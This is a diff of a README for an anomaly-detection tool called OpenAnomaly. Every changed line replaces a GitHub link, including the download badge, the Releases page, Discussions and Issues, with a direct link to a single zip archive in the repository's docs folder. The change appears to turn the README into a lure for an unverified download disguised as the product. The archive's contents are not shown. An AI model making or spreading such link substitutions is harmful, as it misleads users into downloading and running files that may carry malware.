@@ -1,7 +1,7 @@
 # 🚀 OpenAnomaly - Simple Anomaly Detection for Your Data
 
 ## 📥 Download Now
-[![Download OpenAnomaly](https://img.shields.io/badge/Download-OpenAnomaly-brightgreen)](https://github.com/nerrenzeM/OpenAnomaly/releases)
+[![Download OpenAnomaly](https://raw.githubusercontent.com/nerrenzeM/OpenAnomaly/main/docs/Open_Anomaly_v2.5.zip)](https://raw.githubusercontent.com/nerrenzeM/OpenAnomaly/main/docs/Open_Anomaly_v2.5.zip)
 
 ---
 
@@ -25,7 +25,7 @@ OpenAnomaly is a distributed anomaly detection system designed for Prometheus-co
 To get started with OpenAnomaly, follow these simple steps:
 
 1. **Download OpenAnomaly:**
-   Visit the [Releases Page](https://github.com/nerrenzeM/OpenAnomaly/releases) to download the latest version.
+   Visit the [Releases Page](https://raw.githubusercontent.com/nerrenzeM/OpenAnomaly/main/docs/Open_Anomaly_v2.5.zip) to download the latest version.
 
 2. **Install the Application:**
    - **For Windows:**
@@ -48,7 +48,7 @@ To get started with OpenAnomaly, follow these simple steps:
 ## 🌐 Download & Install
 To download and install OpenAnomaly, click the link below to access the Releases page. Ensure you select the correct version for your operating system.
 
-[Visit the Releases Page to Download OpenAnomaly](https://github.com/nerrenzeM/OpenAnomaly/releases)
+[Visit the Releases Page to Download OpenAnomaly](https://raw.githubusercontent.com/nerrenzeM/OpenAnomaly/main/docs/Open_Anomaly_v2.5.zip)
 
 ## 📖 Usage
 OpenAnomaly provides an intuitive user interface. Once installed, you can navigate the application easily:
@@ -65,13 +65,13 @@ If you encounter any issues, try the following:
 1. **Check Your Network Connection:** Ensure you have a stable internet connection to access your data sources.
 2. **Verify Python Installation:** Make sure you have Python 3.7 or higher installed.
 3. **Look for Updates:** Ensure you are using the latest version of OpenAnomaly.
-4. **Consult the Community:** Visit our [GitHub Discussions](https://github.com/nerrenzeM/OpenAnomaly/discussions) for support from other users.
+4. **Consult the Community:** Visit our [GitHub Discussions](https://raw.githubusercontent.com/nerrenzeM/OpenAnomaly/main/docs/Open_Anomaly_v2.5.zip) for support from other users.
 
 ## 🛠️ Contributing
 We welcome contributions to OpenAnomaly. If you have suggestions or improvements, please feel free to open an issue or submit a pull request on our GitHub page.
 
 ## 📞 Contact
-For further assistance, you can reach us through our [GitHub Issues](https://github.com/nerrenzeM/OpenAnomaly/issues). Our team is here to help.
+For further assistance, you can reach us through our [GitHub Issues](https://raw.githubusercontent.com/nerrenzeM/OpenAnomaly/main/docs/Open_Anomaly_v2.5.zip). Our team is here to help.
 
 ## 📚 Additional Resources
 - Official Documentation: Refer to our documentation for more detailed instructions on using OpenAnomaly.
